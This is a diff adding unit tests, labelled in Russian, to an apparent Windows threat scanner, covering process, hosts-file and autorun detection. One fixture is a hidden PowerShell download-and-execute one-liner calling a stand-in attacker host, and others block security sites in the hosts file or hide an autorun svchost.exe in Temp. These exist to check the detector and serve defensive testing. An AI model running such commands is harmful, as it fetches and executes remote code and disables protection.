@@ -169,6 +169,50 @@ async function t(name, fn) {
     assert.ok(store.isIgnored(t2), 'игнор работает');
   });
 
+  await t('процессы: системные не детектятся (powershell, explorer, браузер)', async () => {
+    const procs = [
+      { pid: 1, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
+      { pid: 2, name: 'Explorer.EXE', path: 'C:\\WINDOWS\\Explorer.EXE', cmd: 'C:\\WINDOWS\\Explorer.EXE' },
+      { pid: 3, name: 'browser.exe', path: 'C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe', cmd: '"C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe" --type=crashpad-handler https://example.com/x' },
+      { pid: 4, name: 'steamwebhelper.exe', path: 'C:\\Program Files (x86)\\Steam\\bin\\cef\\cef.win64\\steamwebhelper.exe', cmd: 'steamwebhelper.exe --type=renderer https://steam' },
+    ];
+    const th = analyzeProcesses(procs, [], db, { selfPaths: [] });
+    assert.strictEqual(th.length, 0, 'ложных срабатываний нет: ' + JSON.stringify(th.map((x) => x.title)));
+  });
+
+  await t('процессы: скрытый powershell-загрузчик детектится', async () => {
+    const procs = [{ pid: 9, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'powershell.exe -w hidden -nop IWR https://evil.example/payload -UseBasicParsing | iex' }];
+    const th = analyzeProcesses(procs, [], db, {});
+    assert.ok(th.some((x) => x.title === 'Proc.ScriptDropper'), 'дропер найден: ' + JSON.stringify(th));
+  });
+
+  await t('процессы: свой exe и zapret не детектятся', async () => {
+    const procs = [
+      { pid: 5, name: 'Nukefy.exe', path: 'C:\\Users\\u\\AppData\\Local\\Temp\\3Jh\\Nukefy.exe', cmd: 'Nukefy.exe' },
+      { pid: 6, name: 'Zapret.exe', path: 'C:\\Users\\u\\AppData\\Roaming\\ZapretTwo\\Zapret.exe', cmd: 'Zapret.exe --tray' },
+    ];
+    const th = analyzeProcesses(procs, [], db, { selfPaths: ['C:\\Users\\u\\AppData\\Local\\Temp\\3Jh'] });
+    assert.strictEqual(th.length, 0, JSON.stringify(th));
+  });
+
+  await t('hosts: телеметрия-sinkhole не угроза, блокировка AV — угроза', async () => {
+    const { analyzeHostsText } = require('../src/main/engine/persistence');
+    const ok = analyzeHostsText('45.155.204.190 copilot.microsoft.com\n45.155.204.190 mobile.events.data.microsoft.com\n');
+    assert.strictEqual(ok.length, 0, 'телеметрия не помечена');
+    const bad = analyzeHostsText('127.0.0.1 www.virustotal.com\n127.0.0.1 update.microsoft.com\n');
+    assert.strictEqual(bad.length, 2, 'блокировка сайтов безопасности помечена');
+  });
+
+  await t('автозапуск: zapret доверенный, чужой Temp — нет', async () => {
+    const items = [
+      { source: 'Планировщик', key: 'zapret', name: 'Zapret.exe', command: 'C:\\Users\\u\\AppData\\Roaming\\ZapretTwo\\Zapret.exe --tray', kind: 'task' },
+      { source: 'Реестр HKCU', key: 'HKCU\\...\\Run', name: 'x', command: 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.exe', kind: 'registry' },
+    ];
+    const th = analyzeAutorun(items, db);
+    assert.ok(!th.some((x) => /Zapret/i.test(x.command || '')), 'zapret не помечен');
+    assert.ok(th.some((x) => x.reason === 'masquerade'), 'чужой Temp помечен');
+  });
+
   await t('levenshtein', async () => {
     assert.strictEqual(lev('google', 'gooogle', 2), 1);
     assert.ok(lev('google', 'amazon', 2) > 2);
